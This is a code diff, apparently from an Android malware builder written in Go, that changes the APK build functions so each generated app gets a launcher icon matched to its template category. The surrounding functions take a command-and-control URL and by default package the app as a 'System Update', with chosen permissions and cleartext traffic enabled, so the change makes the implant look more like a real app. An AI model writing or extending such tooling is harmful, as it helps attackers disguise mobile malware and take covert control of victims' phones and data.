@@ -66,7 +66,7 @@ func BuildAndroidAPKWithTemplate(c2URL, outputDir, templateName string) (string,
 	// Convert package name to path
 	pkgPath := strings.ReplaceAll(pkgName, ".", "/")
 
-	return buildAPK(c2URL, outputDir, appName, pkgName, pkgPath, perms)
+	return buildAPK(c2URL, outputDir, appName, pkgName, pkgPath, perms, templateName)
 }
 
 // BuildAndroidAPK compiles the default "System Update" APK.
@@ -74,7 +74,7 @@ func BuildAndroidAPK(c2URL, outputDir string) (string, error) {
 	return BuildAndroidAPKWithTemplate(c2URL, outputDir, "")
 }
 
-func buildAPK(c2URL, outputDir, appName, pkgName, pkgPath string, perms []string) (string, error) {
+func buildAPK(c2URL, outputDir, appName, pkgName, pkgPath string, perms []string, templateName string) (string, error) {
 	sdk, err := findAndroidSDK()
 	if err != nil {
 		return "", fmt.Errorf("Android SDK not found: %w\nInstall Android Studio or set ANDROID_HOME", err)
@@ -93,10 +93,28 @@ func buildAPK(c2URL, outputDir, appName, pkgName, pkgPath string, perms []string
 
 	srcDir := filepath.Join(work, "src", filepath.FromSlash(pkgPath))
 	resDir := filepath.Join(work, "res", "values")
+	drawableDir := filepath.Join(work, "res", "drawable")
 	classDir := filepath.Join(work, "classes")
 	os.MkdirAll(srcDir, 0755)
 	os.MkdirAll(resDir, 0755)
+	os.MkdirAll(drawableDir, 0755)
 	os.MkdirAll(classDir, 0755)
+
+	// Generate app icon based on template category
+	iconCategory := "default"
+	if templateName != "" {
+		tLower := strings.ToLower(strings.ReplaceAll(templateName, "-", " "))
+		for _, templates := range AppTemplates {
+			for _, t := range templates {
+				if strings.ToLower(t.Name) == tLower || strings.Contains(strings.ReplaceAll(strings.ToLower(t.Name), " ", "-"), strings.ReplaceAll(tLower, " ", "-")) {
+					iconCategory = t.Category
+					break
+				}
+			}
+		}
+	}
+	iconPNG := GenerateAppIcon(iconCategory)
+	os.WriteFile(filepath.Join(drawableDir, "ic_launcher.png"), iconPNG, 0644)
 
 	// ── Write AndroidManifest.xml ──
 	permXML := ""
@@ -109,6 +127,7 @@ func buildAPK(c2URL, outputDir, appName, pkgName, pkgPath string, perms []string
     <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="29"/>
 %s    <application
         android:label="%s"
+        android:icon="@drawable/ic_launcher"
         android:allowBackup="true"
         android:usesCleartextTraffic="true">
         <activity android:name=".MainActivity" android:exported="true"
